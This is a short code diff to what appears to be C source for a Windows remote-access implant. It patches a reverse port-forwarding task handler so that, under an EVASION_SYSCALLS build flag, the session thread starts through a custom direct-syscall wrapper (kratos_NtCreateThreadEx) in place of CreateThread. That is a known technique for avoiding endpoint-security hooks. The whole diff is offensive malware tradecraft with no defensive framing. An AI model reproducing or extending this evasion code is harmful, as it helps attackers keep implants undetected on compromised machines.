@@ -1,6 +1,9 @@
 #define _WIN32_WINNT 0x0600
 #include "commands.h"
 #include "utils.h"
+#ifdef EVASION_SYSCALLS
+#include "evasion.h"
+#endif
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -239,7 +242,14 @@ void command_rportfwd(char *task_id, char *params) {
     ctx->local_port  = local_port;
     ctx->remote_port = remote_port;
 
-    HANDLE t = CreateThread(NULL, 0, session_thread, ctx, 0, NULL);
+    HANDLE t = NULL;
+#ifdef EVASION_SYSCALLS
+    kratos_NtCreateThreadEx(&t, THREAD_ALL_ACCESS, NULL,
+                             GetCurrentProcess(), (PVOID)session_thread, ctx,
+                             0, 0, 0, 0, NULL);
+#else
+    t = CreateThread(NULL, 0, session_thread, ctx, 0, NULL);
+#endif
     if (!t) {
         free(ctx);
         g_rpf[idx].active = 0;
